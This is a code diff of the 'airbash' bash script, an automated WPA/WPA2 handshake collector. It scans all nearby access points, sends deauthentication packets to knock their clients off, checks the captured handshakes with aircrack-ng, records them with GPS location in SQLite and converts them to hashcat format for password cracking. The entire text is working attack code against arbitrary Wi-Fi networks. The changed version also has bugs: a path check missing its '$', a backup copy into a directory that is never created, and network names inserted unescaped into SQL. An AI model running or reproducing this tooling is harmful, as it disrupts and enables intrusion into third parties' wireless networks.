@@ -1,4 +1,3 @@
-#!/usr/bin/env bash
 # This is the airbash main script (https://github.com/tehw0lf/airbash)
 # Written by tehw0lf
 # This script is an automated WPA/WPA2 handshake collector which uses
@@ -9,20 +8,19 @@
 # airodump is being run after sending the deauthentication packet. Verification
 # of a captured handshake is done using aircrack-ng
 
+# get platform
+if [ -d "/system" ]; then
+    device=0  # android
+else
+    device=1  # linux
+fi
 
-checkPlatform() {
-	if [ ! -e "/system/bin/adb" ]; then
-		DEVICE_ANDROID=1
-	else
-		DEVICE_LINUX=1
-	fi
-}
 airocheck() {
 	# checks a handshake (passed by file name) using aircrack-ng
 	# returns 1 on success and 0 on failure
 	for s in `ls "$1"*.cap 2>/dev/null`; do
-		if [ `"$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl".c 2>/dev/null | grep -c valid` -eq 0 ]; then
-			if [ `"$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl".c 2>/dev/null | awk '{print $NF}' | grep -c handshake` -ne 0 ]; then
+		if [ `"$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl"known.txt 2>/dev/null | grep -c valid` -eq 0 ]; then
+			if [ `"$AIRCRACK_BIN" -a 2 "$s" -w "$path$wl"known.txt 2>/dev/null | awk '{print $NF}' | grep -c handshake` -ne 0 ]; then
 				cs=1
 			fi
 		fi
@@ -42,20 +40,14 @@ airokill() {
 }
 
 # enviro stuff
-WDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
-DEVICE_ANDROID=0
-DEVICE_LINUX=0
-INTERFACE="wlan1"
-TARGET_BSSID=
+WDIR=`pwd`  # android
+#WDIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"  # linux
+INTERFACE="wlan0"
 AIRCRACK_BIN=`which aircrack-ng`
 AIRODUMP_BIN=`which airodump-ng`
 AIREPLAY_BIN=`which aireplay-ng`
 SQLITE3_BIN=`which sqlite3`
-
-#### CHANGE ME ####
-HCXTOOLS_PATH="~/pentesting/10-Wifi/hcxtools/"
-#### CHANGE ME ####
-
+HC2HCX_BIN=`which wlanhc2hcx`
 
 if [ -z "$AIRCRACK_BIN" ]; then
 	echo "Make sure aircrack-ng is in your path!"
@@ -73,14 +65,14 @@ if [ -z "$SQLITE3_BIN" ]; then
 	echo "Make sure sqlite3 is in your path!";
 	exit
 fi
-if [ -z "$HCXTOOLS_PATH" ]; then
-	echo -e "Make sure the path to hcxtools' wlancap2hcx is correct!\nhttps://github.com/ZerBea/hcxtools.git";
+if [ -z "HC2HCX_BIN" ]; then
+	echo -e "Make sure the path to hcxtools' wlanhc2hcx is correct!\nhttps://github.com/ZerBea/hcxtools/blob/master/wlanhc2hcx.c";
 	exit
 fi
 
 
 # configure path variables
-path="$WDIR"/
+path="$WDIR/"
 db=".db.sqlite3"
 bl=".bl"
 hs=".hs/"
@@ -91,8 +83,6 @@ init="initlist-01.csv"
 
 # create nonexisting paths and files
 mkdir "$path$hs" &>/dev/null
-mkdir "$path$wl" &>/dev/null
-touch "$path$wl"known.txt
 touch "$path$bl"
 airokill
 
@@ -101,27 +91,10 @@ rm -f "$path"initlist &>/dev/null
 rm -f "$path"*.csv &>/dev/null
 rm -f "$path"*.cap &>/dev/null
 
-# cli params
-while getopts ":i:t:" opt; do
-  case $opt in
-    i) INTERFACE="$OPTARG"
-    ;;
-    t) TARGET_BSSID="$OPTARG"
-    ;;
-    \?) echo -e "unknown arg: $OPTARG \nSupported params: -i wifi_interface -t target_BSSID" >&2
-    ;;
-  esac
-done
-
 # initial 20 second scan to determine targets
-echo "Building target list..."
-{ "$AIRODUMP_BIN" -w $path$ofile -o csv $INTERFACE; } &
+{ "$AIRODUMP_BIN" -w $path$ofile -o csv $INTERFACE &>/dev/null; } &
 sleep 20
 airokill
-
-clear
-echo "Charging deauth cannons ;)"
-
 ctr=1
 `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' > "$path"ninitfile`
 ninit=`wc -l < "$path"ninitfile`
@@ -134,26 +107,23 @@ for i in `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | 
 	sleep 2
 	if [ `cat "$path$bl" 2>/dev/null | grep -c $i` -gt 0 ]; then
 	# blacklisted access point
-		echo "AP $i is blacklisted, skipping!!"
 		echo "-         "
 		airokill
-		((ctr++))
+		ctr=$((ctr+1))
 		continue
 	fi
 	if [ `"$SQLITE3_BIN" "$path$db" "SELECT * FROM hs WHERE bssid='$i'" 2>/dev/null | grep -c $i` -gt 0 ]; then
 	# handshake for access point present in database
-		echo "AP $i already in db, skipping!"
 		echo "x         "
 		airokill
-		((ctr++))
+		ctr=$((ctr+1))
 		continue
 	fi
 	if [ `ls "$path$i"*.cap 2>/dev/null | grep -c cap` -eq 0 ]; then
 	# access point is not reachable anymore
-		echo "AP $i has gone away...skipping!"
 		echo "?         "
 		airokill
-		((ctr++))
+		ctr=$((ctr+1))
 		continue
 	fi
 	ctr2=1
@@ -164,7 +134,6 @@ for i in `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | 
 	for j in `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | awk -F ',' '{print $1}'`; do
 		curbssid=`cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | grep -v [\(] | sed '/^\s*$/d' | grep $j | grep $i | awk -F ',' '{print $6}'`
 		if [ "$curbssid" == "$i" ]; then
-			echo "Sending deauth packet to: $i"
 			echo "__$ctr2/$nairo    "
 			# send a single deauth packet
 			{ "$AIREPLAY_BIN" -0 1 -a $i -c $j -F $INTERFACE &>/dev/null; } &
@@ -176,39 +145,38 @@ for i in `cat $path$init 2>/dev/null | tr -d ' ' | awk '/Station/{y=1;next}y' | 
 				break
 			fi
 			airekill
-			((ctr2++))
+			ctr2=$((ctr2+1))
 		else
-			((ctr2++))
+			ctr2=$((ctr2+1))
 		fi
 	done
 	sleep 5
 	airokill
-	((ctr++))
+	ctr=$((ctr+1))
 done
 rm -f "$path"initlist*
 ctr3=0
 # finalize by inserting data for captured handshakes into database
 # and converting the .pcap to a .hccapx file for use with hashcat
 for h in `ls "$path"*.cap 2>/dev/null`; do
-	if [ `"$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl".c 2>/dev/null | grep -c valid` -eq 0 ]; then
-		airstr=`"$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl".c 2>/dev/null | grep handshake`
+	cp "$h" bak/
+	if [ `"$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl"known.txt 2>/dev/null | grep -c valid` -eq 0 ]; then
+		airstr=`"$AIRCRACK_BIN" -a 2 "$h" -w "$path$wl"known.txt 2>/dev/null | grep handshake`
 		getloc=`cat "$path$loc"*.txt 2>/dev/null | awk 'NR==0; END{print}'`
 		if [ `echo "$airstr" | grep -c handshake` -eq 0 ]; then
 			rm -f "$h"
 		else
 			b=`echo "$airstr" | awk '{print $2}'`
 			e=`echo "$airstr" | awk '{for (F=3;F<=NF-3;++F) printf " %s" ($F)}'`
-			echo "1st: $e"
 			e=${e:1:${#e}}
-			echo "2nd: $e"
 			lat=`echo "$getloc" | awk -F ',' '{print $2}'`
 			lon=`echo "$getloc" | awk -F ',' '{print $3}'`
 			"$SQLITE3_BIN" "$path$db" "INSERT INTO hs(lat, lon, bssid, essid) VALUES('$lat', '$lon', '$b', '$e');" 2>/dev/null
 			"$AIRCRACK_BIN" "$h" -J "$h" &>/dev/null
-			"$HCXTOOLS_PATH"wlancap2hcx "$h".hccap -o "$path$hs$b".hccapx &>/dev/null
+			"$HC2HCX_BIN" -o "$path$hs$b".hccapx "$h".hccap &>/dev/null
 			mv "$h" "$path$hs"
 			rm -f "$h".hccap
-			((ctr3++))
+			ctr3=$((ctr3+1))
 		fi
 	else
 		rm -f "$h"
